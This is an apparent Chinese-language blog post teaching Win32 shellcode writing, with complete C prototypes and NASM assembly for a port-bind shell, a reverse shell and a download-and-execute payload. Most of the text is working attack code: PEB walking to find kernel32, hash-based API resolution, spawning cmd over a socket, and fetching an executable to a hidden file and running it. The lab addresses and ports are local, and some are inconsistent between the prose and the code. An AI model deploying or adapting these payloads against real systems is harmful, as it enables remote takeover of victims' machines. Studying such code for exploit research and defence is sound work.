---
layout: post
title: "Win32 shellcode 管窥"
excerpt: "随便写写"
category: exploit
tags: [shellcode]
disqus: true
---

 
# Win32 shellcode 管窥

本文讨论下win32 shellcode。

## 什么是shellcode？

参见维基百科，想要翻译下结果一直没翻译。简单说下，就是一段测试漏洞的代码，可以控制计算机、干坏事等等等等。。。这段代码一般通过某种手段注入到有漏洞的程序内存空间中，运行并向攻击者提供一个控制台。

shellcode通常但也不总是为了获取一个shell，但获取一个shell是获取计算机控制权的一流方式。

## 如何编写shellcode？

在windows中，不要指望像linux下那样用系统调用直接和内核交互，因为windows的系统调用一直在变化，也没有好的文档。

windows下把一些函数放到了dll链接库中，当程序运行时，这些dll库被载入到当前程序的内存空间中。调用这些函数只要知道这些函数的地址就行了。可是，每一个windows版本甚至一个补丁都会让这些地址变化。

但kernel32一定会被加载到内存空间中去，kernel32.dll的地址在一个叫作PEB的块中却比较固定，于是人们就搜索PEB来找到kernel32.dll的地址。

找到kernel32的地址之后，可以通过输出表(Export Table)搜索和解析之中所有的函数地址。尽管有些dll并不像kernel32一定会加载到程序内存空间中，却可以解析kernel32中的LoadLibraryA来载入它们，然后通过同样的解析函数方法来解析这些dll中的函数地址。

由于shellcode的独特性，我们用汇编会获取更好的控制。但首先我会先用C语言来原型，搞清楚这些程序都干了什么。

### 工具

我用了以下一些工具：

- wine lcc ： C编译器
- wine immunity debugger： 调试器
- shell ：工作环境和测试脚本
- nasm ：汇编器
- python： 我用来写一些小工具来比如帮助获取倒过来(因为x86中字节序的问题)函数哈希。

当然还有写od一类的unix小工具，一个正常的linux发行版都会有这些东西的。

### 工作流

1. 找到kernel32的地址
2. 解析出想要调用函数的地址
3. 在堆上构建参数和调用函数

虽然原理很简单，但是有些小细节：

1. 尽量模块化重复代码即使用函数。函数尽量没有副作用，就是说尽量别把寄存器搞得乱七八糟。
2. 尽量向前跳而不是向后跳，这是为了什么来着，对了为了减少shellcode中的NULL。你可以先不考虑这个问题，这比较复杂，这需要熟悉哪些等效的机器码没有bad characters。
3. 记住jmp不能跳太远，也许你需要一些中转点。
4. 你可以把要用到的常量或者参数直接放到shellcode中某处，或者就地在栈上构建，只要你方便索引就行。这主要看需求，比如你想集成的metasploit中，就最好把想更改的东西放到固定位置。

## 示例

Talk is cheap, show you the code... C代码是我自己写的，shellcode不一定是我自己写的。但即使是我自己写的也要仰仗于nologin上那篇著名的win32shellcode论文和projectshellcode上的示例。推荐有兴趣的人看看。

### 示例1：端口绑定shellcode

绑定一个端口并提供远程控制台。绑定到本机4444

C原型：

```c
/*
 * =====================================================================================
 *
 *       Filename:  port_bind.c
 *
 *    Description:  port_bind in windows
 *
 *        Version:  1.0
 *        Created:  08/18/2013 05:01:19 PM
 *       Revision:  none
 *       Compiler:  lcc
 *
 *         Author:  reverland, 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

int main(){
  WSADATA wsaData;
  WORD wVersionRequested;
  struct sockaddr_in host;
  struct sockaddr* addr;
  SOCKET MySock, NSock;
  wVersionRequested = MAKEWORD(2, 2);
  int nret;

  // FreeConsole
  FreeConsole();
  printf("size of WSADATA is %d\n", sizeof(wsaData));
  printf("size of wVersionRequested is %d\n", sizeof(wVersionRequested));
  // WSAStartup
  if (WSAStartup(wVersionRequested, &wsaData) < 0)
  {
    printf("ws2 outof date!\n");
    WSACleanup();
    exit(1);
  }

  // WSASocket
  MySock = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);

  host.sin_family = AF_INET;
  host.sin_addr.s_addr = INADDR_ANY;
  host.sin_port = htons(4444);

  // bind
  nret = bind(MySock, (struct sockaddr*)&host, sizeof(host));
  printf("size of sockadr is %d\n", sizeof(host));

  if (nret == SOCKET_ERROR)
    {
      printf("Error on bind\n");
      WSACleanup();
      exit(1);
    }

  // listen
  nret = listen(MySock, 16);

  if (nret == SOCKET_ERROR)
    {
      printf("Error on bind\n");
      WSACleanup();
      exit(1);
    }

  // accept
  addr = malloc(16);
  int addrlen = 16;
  NSock = accept(MySock, addr, &addrlen);
  if (NSock == SOCKET_ERROR)
  {
    printf("Error on accept\n");
  }

  // CreateProcess
  char cmd[] = "cmd";
  STARTUPINFO startupinfo;
  printf("size of STARTUPINFO is %d\n", sizeof(startupinfo));
  PROCESS_INFORMATION processinformation;
  printf("size of PROCESS_INFORMATION is %d\n", sizeof(processinformation));
  memset(&startupinfo, '\0', sizeof(STARTUPINFO));
  memset(&processinformation, '\0', sizeof(PROCESS_INFORMATION));
  startupinfo.cb = 0x44;
  startupinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
  startupinfo.wShowWindow = SW_HIDE;
  startupinfo.hStdInput = (HANDLE)NSock;
  startupinfo.hStdOutput =(HANDLE)NSock;
  startupinfo.hStdError = (HANDLE)NSock;
  FreeConsole();
  CreateProcess(NULL, cmd, NULL, NULL, 1, 0, NULL, NULL, &startupinfo, &processinformation);

  // ExitProcess
  ExitProcess(0);
}
```

asm.c :

```nasm
; port_bind.asm
BITS 32
[SECTION .text]
global _start
_start:
    jmp start_asm

;DEFINE FUNCTIONS

    find_kernel32:
        push esi
	xor eax, eax
	mov eax, [fs:eax+0x30] 	;PEB
	mov eax, [eax + 0x0c]	;PEB->LoaderData
	mov esi, [eax + 0x1c]	;PEB->LoaderData->InInitializationOrderModuleList
	lodsd			;next entry the double linked list point to
	mov eax, [eax + 0x8]	;imagebase of kernel32
	pop esi
	ret

	;END FUNCTION: find_kernel32

	; FUNCTION: find_function
    find_function:		; find_functions(edx, eax)
        pushad
	mov ebp, [esp+0x24]	;edx(dll)
	mov eax, [ebp+0x3c]	;Skip MS DOS header to PE header
	mov edx, [ebp+eax+0x78]	;Export table is 0x78 byts from the start of the PE header
	add edx, ebp		;Absolute address
	mov ecx, [edx+0x18]	;Number of functions
	mov ebx, [edx+0x20]	; address of names(rva) table relative offset
	add ebx, ebp		; make the name talbe address absolute
    find_function_loop:
	jecxz find_function_finished
	dec ecx
	mov esi, [ebx+ecx*4]
	add esi, ebp
    compute_hash:
        xor edi, edi
	xor eax, eax
	cld
    compute_hash_again:
        lodsb
	test al, al
	jz compute_hash_finished
	ror edi, 0xd
	add edi, eax
	jmp compute_hash_again
    compute_hash_finished:
    find_funtion_compare:
        cmp edi, [esp+0x28]
	jnz find_function_loop
	mov ebx, [edx+0x24]	; Exetract ordinals table relative offset and store it in ebx
	add ebx, ebp
	mov cx, [ebx + 2*ecx]	; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size
	mov ebx, [edx+0x1c]	;Extract the address table relative offset and store it in ebx
	add ebx, ebp		; make the address table address absolute
	mov eax, [ebx + 4*ecx]	; extract the realtve function offset from its ordinal and store it in eax
	add eax, ebp
	mov [esp+0x1c], eax	; overwrite eax
    find_function_finished:
	popad
	ret

	; END FUNCTION: find_function
	; FUNCTION: resolve_symbols_for_dll
    resolve_symbols_for_dll:
	; about to load current hash into eax(pointed by esi)
	lodsd
	push eax
	push edx
	call find_function
	mov [edi], eax
	add esp, 0x08
	add edi, 0x04
	cmp esi, ecx
	jne resolve_symbols_for_dll
    resolve_symbols_for_dll_finished:
        ret

	; END FUNCTION: resolve_symbols_for_dll

;END FUNCTIONS

    locate_kernel32_hashes:
        call locate_kernel32_hashes_return
	; BIG ENDIAN
	; LoadLibraryA
	db 0x8e, 0x4e, 0x0e, 0xec
	; CreateProcessA
	db 0x72, 0xfe, 0xb3, 0x16
	; ExitProcess
	db 0x7e, 0xd8, 0xe2, 0x73
    ;locate ws2_32_hashes
        ; WSASocketA
	db 0xd9, 0x09, 0xf5, 0xad
	; bind
	db 0xa4, 0x1a, 0x70, 0xc7
	; listen
	db 0xa4, 0xad, 0x2e, 0xe9
	; accept
	db 0xe5, 0x49, 0x86, 0x49
	; WSAStartup
	db 0xcb, 0xed, 0xfc, 0x3b
    ; END DEFINE CONSTANTS

    start_asm:
       sub esp, 0x68 ; !!随便给的
       mov ebp, esp
       call find_kernel32
       mov edx, eax
       ; resolve kernel32 symbols
       jmp short locate_kernel32_hashes
    locate_kernel32_hashes_return:
       pop esi
       lea edi,[ebp+0x00] 
       mov ecx, esi

	
        

       add ecx, 0x0c ; length of kernel32 list
       call resolve_symbols_for_dll

       ; resolve ws2_32 symbols
       add ecx, 0x14
       xor eax, eax
       mov ax, 0x3233
       push eax
       push dword 0x5f327377
       mov ebx, esp ; point to "ws2_32"

       push ecx
       push edx
       push ebx
       call [ebp+0x0]

       pop edx ; kernel32 address
       pop ecx ; counter
       mov edx, eax ; ws2_32.dll address
       call resolve_symbols_for_dll

   initialize_cmd:
       mov eax, 0x646d6301
       sar eax, 0x08
       push eax
       mov [ebp+0x30], esp

   WSAStartup:
       xor edx, edx
       mov edx, 0x190
       sub esp, edx
       ; initialize winsock
       push esp
       push 0x02
       call [ebp+0x1c]
       add esp, 0x190

   create_socket:
       xor eax, eax
       push eax
       push eax
       push eax
       push eax
       inc eax
       push eax
       inc eax
       push eax
       call [ebp+0x0c]
       mov esi, eax

   bind:
       xor eax, eax
       xor ebx, ebx
       push eax
       push eax
       push eax
       mov eax, 0x5c110102
       dec ah
       push eax
       mov eax, esp
       mov bl, 0x10
       push ebx
       push eax
       push esi
       call [ebp+0x10]

   listen:
       push ebx
       push esi
       call [ebp+0x14]

   accept:
       push ebx
       mov edx, esp
       sub esp, ebx
       mov ecx, esp
       push edx
       push ecx
       push esi
       call [ebp+0x18]
       mov esi, eax

   initialize_process:
       xor ecx, ecx
       mov cl, 0x54
       sub esp,ecx
       mov edi, esp
       push edi
   zero_structs:
       xor eax, eax
       rep stosb
       pop edi
   initialize_structs:
       mov byte [edi], 0x44
       inc byte [edi+0x2d] ; STARTF_USESTDHANDLES 
       push edi
       mov eax, esi
       lea edi, [edi+0x38]
       stosd
       stosd
       stosd
       pop edi
   execute_process:
       xor eax, eax
       lea esi, [edi+0x44]
       push esi
       push edi
       push eax
       push eax
       push eax
       inc eax
       push eax
       dec eax
       push eax
       push eax
       push dword [ebp+0x30] ; p->"cmd"
       push eax
       call [ebp+0x04]
   exit_process:
       call [ebp+0x08]
```

### 示例2：反弹shellcode

反向连接shellcode，提供远程控制台。反向到192.168.56.102, 端口4444

C 示例：

```c
/*
 * =====================================================================================
 *
 *       Filename:  connectback.c
 *
 *    Description:  Connect back example
 *
 *        Version:  1.0
 *        Created:  08/23/2013 04:49:55 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Reverland, 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <winsock2.h>
#include <wininet.h>


int main(){
  WSADATA wsaData;
  WORD wVersionRequested;
  struct sockaddr_in host, client;
  struct sockaddr* addr;
  SOCKET MySock, NSock;
  wVersionRequested = MAKEWORD(2, 2);
  int nret;
  char ip[] = "127.0.0.1";

  // FreeConsole
  FreeConsole();
  printf("size of WSADATA is %d\n", sizeof(wsaData));
  printf("size of wVersionRequested is %d\n", sizeof(wVersionRequested));
  // WSAStartup
  if (WSAStartup(wVersionRequested, &wsaData) < 0)
  {
    printf("ws2 outof date!\n");
    WSACleanup();
    exit(1);
  }

  // WSASocket
  MySock = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);

  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr(ip);
  client.sin_port = htons(4444);

  // bind
  nret = connect(MySock, (struct sockaddr*)&client, sizeof(client));
  printf("size of sockadr is %d\n", sizeof(host));

  if (nret == SOCKET_ERROR)
    {
      printf("Error on connect\n");
      WSACleanup();
      exit(1);
    }

  // CreateProcess
  char cmd[] = "cmd";
  STARTUPINFO startupinfo;
  printf("size of STARTUPINFO is %d\n", sizeof(startupinfo));
  PROCESS_INFORMATION processinformation;
  printf("size of PROCESS_INFORMATION is %d\n", sizeof(processinformation));
  memset(&startupinfo, '\0', sizeof(STARTUPINFO));
  memset(&processinformation, '\0', sizeof(PROCESS_INFORMATION));
  startupinfo.cb = 0x44;
  startupinfo.dwFlags = STARTF_USESTDHANDLES;
  startupinfo.hStdInput = (HANDLE)MySock;
  startupinfo.hStdOutput =(HANDLE)MySock;
  startupinfo.hStdError = (HANDLE)MySock;
  FreeConsole();
  CreateProcess(NULL, cmd, NULL, NULL, 1, 0, NULL, NULL, &startupinfo, &processinformation);

  // ExitProcess
  ExitProcess(0);
}
```

asm：

```nasm
[SECTION .text]
BITS 32
global _start
_start:
    jmp start_asm

;DEFINE FUNCTIONS

    find_kernel32:
        push esi
	xor eax, eax
	mov eax, [fs:eax+0x30] 	;PEB
	mov eax, [eax + 0x0c]	;PEB->LoaderData
	mov esi, [eax + 0x1c]	;PEB->LoaderData->InInitializationOrderModuleList
	lodsd			;next entry the double linked list point to
	mov eax, [eax + 0x8]	;imagebase of kernel32
	pop esi
	ret

	;END FUNCTION: find_kernel32

	; FUNCTION: find_function
    find_function:		; find_functions(edx, eax)
        pushad
	mov ebp, [esp+0x24]	;edx(dll)
	mov eax, [ebp+0x3c]	;Skip MS DOS header to PE header
	mov edx, [ebp+eax+0x78]	;Export table is 0x78 byts from the start of the PE header
	add edx, ebp		;Absolute address
	mov ecx, [edx+0x18]	;Number of functions
	mov ebx, [edx+0x20]	; address of names(rva) table relative offset
	add ebx, ebp		; make the name talbe address absolute
    find_function_loop:
	jecxz find_function_finished
	dec ecx
	mov esi, [ebx+ecx*4]
	add esi, ebp
    compute_hash:
        xor edi, edi
	xor eax, eax
	cld
    compute_hash_again:
        lodsb
	test al, al
	jz compute_hash_finished
	ror edi, 0xd
	add edi, eax
	jmp compute_hash_again
    compute_hash_finished:
    find_funtion_compare:
        cmp edi, [esp+0x28]
	jnz find_function_loop
	mov ebx, [edx+0x24]	; Exetract ordinals table relative offset and store it in ebx
	add ebx, ebp
	mov cx, [ebx + 2*ecx]	; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size
	mov ebx, [edx+0x1c]	;Extract the address table relative offset and store it in ebx
	add ebx, ebp		; make the address table address absolute
	mov eax, [ebx + 4*ecx]	; extract the realtve function offset from its ordinal and store it in eax
	add eax, ebp
	mov [esp+0x1c], eax	; overwrite eax
    find_function_finished:
	popad
	ret

	; END FUNCTION: find_function
	; FUNCTION: resolve_symbols_for_dll
    resolve_symbols_for_dll:
	; about to load current hash into eax(pointed by esi)
	lodsd
	push eax
	push edx
	call find_function
	mov [edi], eax
	add esp, 0x08
	add edi, 0x04
	cmp esi, ecx
	jne resolve_symbols_for_dll
    resolve_symbols_for_dll_finished:
        ret

	; END FUNCTION: resolve_symbols_for_dll

;END FUNCTIONS

    locate_kernel32_hashes:
        call locate_kernel32_hashes_return
        ;LoadLibraryA
        db 0x8e
        db 0x4e
        db 0x0e
        db 0xec
        ;CreateProcessA
        db 0x72
        db 0xfe
        db 0xb3
        db 0x16
        ;ExitProcess
        db 0x7e
        db 0xd8
        db 0xe2
        db 0x73
        ;locate_ws2_32_hashes:
        ;WSASocketA
        db 0xd9
        db 0x09
        db 0xf5
        db 0xad
        ;connect
        db 0xec
        db 0xf9
        db 0xaa
        db 0x60
        ;WSAStartup
        db 0xcb
        db 0xed
        db 0xfc
        db 0x3b
        ;END DEFINE CONSTANTS

    start_asm:
        sub esp, 0x68
	mov ebp, esp
	call find_kernel32
	mov edx, eax
        ; resolve kernel32 symbols
        jmp short locate_kernel32_hashes
    locate_kernel32_hashes_return:
        pop esi
        lea edi,[ebp+0x00] 
        mov ecx, esi
        add ecx, 0x0c ; length of kernel32 list
        call resolve_symbols_for_dll

        ; resolve ws2_32 symbols
        add ecx, 0x0c
	; create ws2_32 string
        xor eax, eax
        mov ax, 0x3233
        push eax
        push dword 0x5f327377
        mov ebx, esp ; point to "ws2_32"

	push ecx
        push edx
        push ebx
        call [ebp+0x0] ; LoadLibraryA("ws2_32")

        pop edx ; kernel32 address
        pop ecx ; counter
        mov edx, eax ; ws2_32.dll address
        call resolve_symbols_for_dll

        initialize_cmd:
            mov eax, 0x646d6301
            sar eax, 0x08
            push eax
            mov [ebp+0x24], esp
	
        WSAStartup:
            xor edx, edx
            mov edx, 0x190
            sub esp, edx
            ; initialize winsock
            push esp
            push 0x02
            call [ebp+0x14]
            add esp, 0x190

   create_socket:
       xor eax, eax
       push eax
       push eax
       push eax
       push eax
       inc eax
       push eax
       inc eax
       push eax
       call [ebp+0x0c]
       mov esi, eax

    do_connect:
        push 0x0100007f
	mov eax, 0x5c110102
	dec ah
	push eax
	mov ebx, esp
	xor eax, eax
	mov al, 0x10
	push eax
	push ebx
	push esi
	call [ebp+0x10]

   initialize_process:
       xor ecx, ecx
       mov cl, 0x54
       sub esp,ecx
       mov edi, esp
       push edi
   zero_structs:
       xor eax, eax
       rep stosb
       pop edi
   initialize_structs:
       mov byte [edi], 0x44
       inc byte [edi+0x2d] ; STARTF_USESTDHANDLES 
       push edi
       mov eax, esi
       lea edi, [edi+0x38]
       stosd
       stosd
       stosd
       pop edi
   execute_process:
       xor eax, eax
       lea esi, [edi+0x44]
       push esi
       push edi
       push eax
       push eax
       push eax
       inc eax
       push eax
       dec eax
       push eax
       push eax
       push dword [ebp+0x24] ; p->"cmd"
       push eax
       call [ebp+0x04]
   exit_process:
       call [ebp+0x08]
```

### 下载并运行shellcode

C原型：

```c
/*
 * =====================================================================================
 *
 *       Filename:  download_execute.c
 *
 *    Description:  Download and execute shellcode
 *
 *        Version:  1.0
 *        Created:  08/22/2013 03:53:36 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Reverland, 
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <wininet.h>

int main(){
  HINTERNET nethandle;

  // allocate an internet handle
  printf("Allocate an internet handle\n");
  nethandle = InternetOpen(NULL, 0, NULL, NULL, 0);
  if (nethandle == NULL)
  {
    printf("Error on InternetOpen\n");
    exit(0);
  }

  // allocate a resource handle
  printf("Allocate a resource handle\n");
  HINTERNET reshandle;
  char url[] = "http://localhost:4000/calc.exe";
  reshandle = InternetOpenUrl(nethandle, url, NULL, 0, 0, 0);
  if (reshandle == NULL)
  {
    printf("Error on InternetOpenUrl\n");
    exit(0);
  }

  // Create the local executable file
  printf("Create the local executable file\n");
  HANDLE filehandle;
  char filename[] = "something.exe";
  filehandle = CreateFile(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN, NULL);
  if (filehandle == 0)
  {
    printf("Error on CreateFile\n");
    exit(0);
  }

  
  // Download the executable
  printf("download the executable\n");
  DWORD NumberOfBytesRead=0;
  DWORD NumberOfBytesWritten=0;
  BOOL nret;
  while (1==1){
    void *Buffer = malloc(260);
    nret = InternetReadFile(reshandle, Buffer, 260, &NumberOfBytesRead);
    printf("InternetReadFile\n");
    printf("read %d bytes\n", (int)NumberOfBytesRead);
    printf("%s\n", (char *)Buffer);
    if (NumberOfBytesRead == 0)
      break;
    printf("WriteFile\n");
    nret = WriteFile(filehandle, Buffer, NumberOfBytesRead, &NumberOfBytesWritten, NULL);
    printf("write %d bytes\n", (int)NumberOfBytesWritten);
    if (nret == 0)
    {
      printf("Error on Writefile\n");
      exit(0);
    }
    free(Buffer);
  }
  printf("Close handle\n");
  CloseHandle(filehandle);

  // Create Process
  printf("Create Process\n");
  STARTUPINFO startupinfo;
  // printf("size of STARTUPINFO is %d\n", sizeof(startupinfo));
  PROCESS_INFORMATION processinformation;
  // printf("size of PROCESS_INFORMATION is %d\n", sizeof(processinformation));
  memset(&startupinfo, '\0', sizeof(STARTUPINFO));
  memset(&processinformation, '\0', sizeof(PROCESS_INFORMATION));
  startupinfo.cb = 0x44;
  CreateProcess(NULL, filename, NULL, NULL, 0, 0, NULL, NULL, &startupinfo, &processinformation);

  ExitProcess(0);
}
```

asm：

```nasm
; port_bind.asm
BITS 32
[SECTION .text]
global _start
_start:
    jmp start_asm

;DEFINE FUNCTIONS

    find_kernel32:
        push esi
	xor eax, eax
	mov eax, [fs:eax+0x30] 	;PEB
	mov eax, [eax + 0x0c]	;PEB->LoaderData
	mov esi, [eax + 0x1c]	;PEB->LoaderData->InInitializationOrderModuleList
	lodsd			;next entry the double linked list point to
	mov eax, [eax + 0x8]	;imagebase of kernel32
	pop esi
	ret

	;END FUNCTION: find_kernel32

	; FUNCTION: find_function
    find_function:		; find_functions(edx, eax)
        pushad
	mov ebp, [esp+0x24]	;edx(dll)
	mov eax, [ebp+0x3c]	;Skip MS DOS header to PE header
	mov edx, [ebp+eax+0x78]	;Export table is 0x78 byts from the start of the PE header
	add edx, ebp		;Absolute address
	mov ecx, [edx+0x18]	;Number of functions
	mov ebx, [edx+0x20]	; address of names(rva) table relative offset
	add ebx, ebp		; make the name talbe address absolute
    find_function_loop:
	jecxz find_function_finished
	dec ecx
	mov esi, [ebx+ecx*4]
	add esi, ebp
    compute_hash:
        xor edi, edi
	xor eax, eax
	cld
    compute_hash_again:
        lodsb
	test al, al
	jz compute_hash_finished
	ror edi, 0xd
	add edi, eax
	jmp compute_hash_again
    compute_hash_finished:
    find_funtion_compare:
        cmp edi, [esp+0x28]
	jnz find_function_loop
	mov ebx, [edx+0x24]	; Exetract ordinals table relative offset and store it in ebx
	add ebx, ebp
	mov cx, [ebx + 2*ecx]	; Extract the current symbos ordinal number from the ordinal table; Ordinals are 2 bytes in size
	mov ebx, [edx+0x1c]	;Extract the address table relative offset and store it in ebx
	add ebx, ebp		; make the address table address absolute
	mov eax, [ebx + 4*ecx]	; extract the realtve function offset from its ordinal and store it in eax
	add eax, ebp
	mov [esp+0x1c], eax	; overwrite eax
    find_function_finished:
	popad
	ret

	; END FUNCTION: find_function
	; FUNCTION: resolve_symbols_for_dll
    resolve_symbols_for_dll:
	; about to load current hash into eax(pointed by esi)
	lodsd
	push eax
	push edx
	call find_function
	mov [edi], eax
	add esp, 0x08
	add edi, 0x04
	cmp esi, ecx
	jne resolve_symbols_for_dll
    resolve_symbols_for_dll_finished:
        ret

	; END FUNCTION: resolve_symbols_for_dll

;END FUNCTIONS

    locate_kernel32_hashes:
        call locate_kernel32_hashes_return
	; BIG ENDIAN
	; LoadLibraryA---ebp
	db 0x8e, 0x4e, 0x0e, 0xec
	; CreateFile---ebp+4
	db 0xa5, 0x17, 0x0, 0x7c
	; WriteFile---ebp+0x8
        db 0x1f, 0x79, 0xa, 0xe8
        ; CloseHandle---ebp+0xc
        db 0xfb, 0x97, 0xfd, 0xf
	; CreateProcessA---ebp+0x10
	db 0x72, 0xfe, 0xb3, 0x16
	; ExitProcess---ebp+0x14
	db 0x7e, 0xd8, 0xe2, 0x73
    ; Wininet.dll function hashes
        ; InternetOpenA---ebp+0x18
        db 0x29, 0x44, 0xe8, 0x57
	; InternetOpenUrlA---ebp+0x1c
        db 0x49, 0xed, 0xf, 0x7e
        ; InternetReadFile---ebp+0x20
        db 0x8b, 0x4b, 0xe3, 0x5f

    ; DEFINE Constants END
        
    start_asm:
        sub esp, 0x88
	mov ebp, esp
	call find_kernel32
	mov edx, eax
	; resolve kernel32 symbols
	jmp short locate_kernel32_hashes
    locate_kernel32_hashes_return:
        pop esi
	lea edi, [ebp+0x00]
	mov ecx, esi
	add ecx, 0x18 	; length of kernel32 list
	call resolve_symbols_for_dll

	; resolve wininet symbols
	add ecx, 0xc
	; xor eax, eax
	mov eax, 0x74656e01
	sar eax, 0x08
	push eax	; net
	push 0x696e6977	; wini
	mov ebx, esp
	push ecx	; preserve ecx, LoadLibraryA 破坏ecx和edx?
	push edx	; preserve edx
	push ebx
	call [ebp+0x0]
	pop edx
	pop ecx
	mov edx, eax	; 之前保护edx干么...?
	call resolve_symbols_for_dll
    internet_open:
        xor eax, eax
	push eax
	push eax
	push eax
	push eax
	push eax
	call [ebp+0x18]
	mov [ebp+0x24], eax ; nethandle
    internet_open_url:
        xor eax, eax
	mov ax, 0x6578
	push eax
	push 0x652e636c 	; calc.exe
	push 0x61632f30
	push 0x3030383a
	push 0x74736f68
	push 0x6c61636f
	push 0x6c2f2f3a
	push 0x70747468 ; http://localhost:8000/calc.exe
	mov ebx, esp
	xor eax, eax
	push eax
	push eax
	push eax
	push eax
	push ebx
	push dword [ebp+0x24]		;nethandle
	call [ebp+0x1c]
	mov [ebp+0x28], eax	; reshandle
    
    create_file:
        xor eax, eax
	mov al, 0x65
	push eax
	push 0x78652e67
	push 0x6e696874
	push 0x656d6f73 	; something.exe
	mov [ebp+0x2c], esp	; filename->something
	xor eax, eax
	push eax
	mov al, 0x82		; FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN
	push eax
	mov al, 0x02
	push eax		; CREATE_ALWAYS
	xor al, al
	push eax
	push eax
	mov al, 0x40
	sal eax, 0x18		; GENERIC_ALL
	push eax
	push dword [ebp+0x2c]
	call [ebp+0x4]
	mov [ebp+0x30], eax	; filehandle

    download_begin:
        xor eax, eax
	mov ax, 0x010c	; esi->DWORD numberofbytesread + 260 buffer
	sub esp, eax
	mov esi, esp
    download_loop:
        push esi	; 
	mov ax, 0x0104
	push eax
	lea eax, [esi+4]
	push eax
	push dword [ebp+0x28]		; reshandle
	call [ebp+0x20]
	mov eax, [esi]		; NumbeOfBytesRead
	test eax, eax
	jz download_finished
    download_write_file:
        xor eax, eax
	push eax		
	push esi
	push dword [esi]
	lea eax, [esi+0x04]
	push eax
	push dword [ebp+0x30]
	call [ebp+0x8]
	jmp download_loop
    download_finished:
        push dword [ebp+0x30]
	call [ebp+0xc]
	xor eax, eax
	mov ax, 0x0104 	; restore stack
	; CreateProcess
    initialize_process:
	add esp, eax
	xor ecx, ecx
	mov cl, 0x54
	sub esp, ecx
	mov edi, esp
    zero_structs:
        xor eax, eax
	rep stosb
    initialize_structs:
        mov edi, esp
	mov byte [edi], 0x44	; !!!!!cb
    execute_process:
        lea esi, [edi+0x44]		; esi->process_information
	push esi
	push edi
	push eax
	push eax
	push eax
	push eax
	push eax
	push eax
	push dword [ebp+0x2c]		; ->"something"
	push eax
	call [ebp+0x10]
    exit_process:
        call [ebp+0x14]
```

### 分阶段shellcode

第一阶段建立连接，并读取shellcode，然后指向执行。

待续。。。
